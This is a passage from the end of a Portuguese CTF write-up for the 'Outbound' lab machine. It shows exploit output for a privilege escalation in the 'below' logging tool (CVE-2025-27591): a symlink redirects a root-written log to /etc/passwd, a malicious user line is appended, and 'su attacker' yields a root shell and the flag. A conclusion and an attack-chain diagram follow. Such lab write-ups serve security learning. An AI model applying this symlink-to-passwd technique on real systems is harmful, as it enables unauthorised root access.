[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Nov 04 23:39:47.321 DEBG Starting up!
Nov 04 23:39:47.322 ERRO
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01762214400: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/tmp/pr3ach3r# id
uid=0(root) gid=0(root) groups=0(root)
root@outbound:/tmp/pr3ach3r# whoami
root
root@outbound:/tmp/pr3ach3r# ls -a  /root
.   .bash_history  .cache    .local    root.txt  .ssh
..  .bashrc        .lesshst  .profile  .scripts  .viminfo
root@outbound:/tmp/pr3ach3r# cat /root/root.txt
278231be0aa17ab7baf984b082200cbe
```

## Conclusão

![[OutboundFinal.png| Mesma imagem do início, porém agora diz abaixo: Outbound has been pwned]]

Terminar essa máquina foi bem interessante. A parte de decriptar o password do `jacob` foi bem desafiadora no meu caso, pois eu não conhecia nada sobre a criptografia `Triple DES`. Por ser uma máquina classificada como *fácil*, haviam exploits prontos tanto para o *acesso inicial*, quanto para a *escalação de privilégios*. Então não tive dificuldades nessa parte, mas imagino que se tivesse testado na semana de lançamento da máquina, haveriam algumas dificuldades extras.

```mermaid
flowchart TD
	subgraph acesso inicial
    A(Roundcube webmail) -->|CVE‑2025‑49113| B(www-data@mail) 
    B -->|config.inc.php & password cracking| C(jacob@mail)
    C -->|plaintext password on e-mail| D(jacob@outbound)
    end
    subgraph escalação de privilegios
    D -->|CVE-2025-27591 exploit.py| E(root)
    end
```


